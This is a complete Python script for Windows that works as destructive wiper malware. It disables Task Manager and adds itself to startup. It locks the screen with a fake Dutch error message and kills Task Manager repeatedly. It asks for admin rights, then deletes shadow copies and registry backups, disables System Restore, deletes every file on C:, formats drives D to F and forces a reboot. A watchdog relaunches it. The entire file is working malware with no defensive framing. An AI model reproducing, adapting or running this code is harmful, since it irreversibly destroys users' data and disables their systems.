import os
import subprocess
import ctypes
import threading
import time
import sys
import winreg
import tkinter as tk

def disable_task_manager():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def add_to_startup():
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Simplex", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

def lock_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg='black')
    label = tk.Label(root, text="Er ging iets mis. Systeem opnieuw opstarten", fg="red", bg="black", font=("Arial", 40))
    label.pack(expand=True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    ctypes.windll.user32.SetWindowPos(root.winfo_id(), -1, 0, 0, 0, 0, 0x0001 | 0x0002)
    root.mainloop()

def kill_taskmgr_loop():
    while True:
        subprocess.call('taskkill /f /im Taskmgr.exe', shell=True)
        time.sleep(1)

def schedule_reboot():
    
    def reboot():
        os.system("shutdown /r /t 0")
    threading.Timer(90, reboot).start()

def wipe_all_disks():
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            os.system("vssadmin delete shadows /all /quiet >nul 2>&1")
            os.system("wmic shadowcopy delete >nul 2>&1")
            os.system("powershell -Command \"Disable-ComputerRestore -Drive 'C:'\" >nul 2>&1")
            os.system("powershell -Command \"Clear-RecycleBin -Force\" >nul 2>&1")
            for drive in ["C", "D", "E", "F"]:
                os.system(f'del /s /f /q {drive}:\\*.bak >nul 2>&1')
                os.system(f'del /s /f /q {drive}:\\*.tmp >nul 2>&1')
                os.system(f'del /s /f /q {drive}:\\*.log >nul 2>&1')
                os.system(f'del /s /f /q {drive}:\\*.old >nul 2>&1')
                os.system(f'del /s /f /q {drive}:\\*.restore >nul 2>&1')
            os.system("del /f /s /q C:\\Windows\\System32\\config\\RegBack\\*.* >nul 2>&1")
            os.system("takeown /f C:\\ /r /d y >nul 2>&1")
            os.system("icacls C:\\ /grant administrators:F /t >nul 2>&1")
            os.system("del /f /s /q C:\\*.* >nul 2>&1")
            os.system("for /d %x in (C:\\*) do rd /s /q \"%x\" >nul 2>&1")
            for drive in ["D", "E", "F"]:
                os.system(f"format {drive}: /fs:NTFS /q /x /y >nul 2>&1")

            schedule_reboot()
        except:
            pass
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, "--child", None, 0)

def self_watchdog():
    while True:
        subprocess.Popen([sys.executable, __file__, "--child"], creationflags=subprocess.CREATE_NO_WINDOW).wait()
        time.sleep(1)

if __name__ == "__main__":
    disable_task_manager()
    add_to_startup()

    if "--child" in sys.argv:
        threading.Thread(target=lock_screen).start()
        threading.Thread(target=kill_taskmgr_loop).start()
        threading.Thread(target=wipe_all_disks).start()
    else:
        threading.Thread(target=self_watchdog).start()
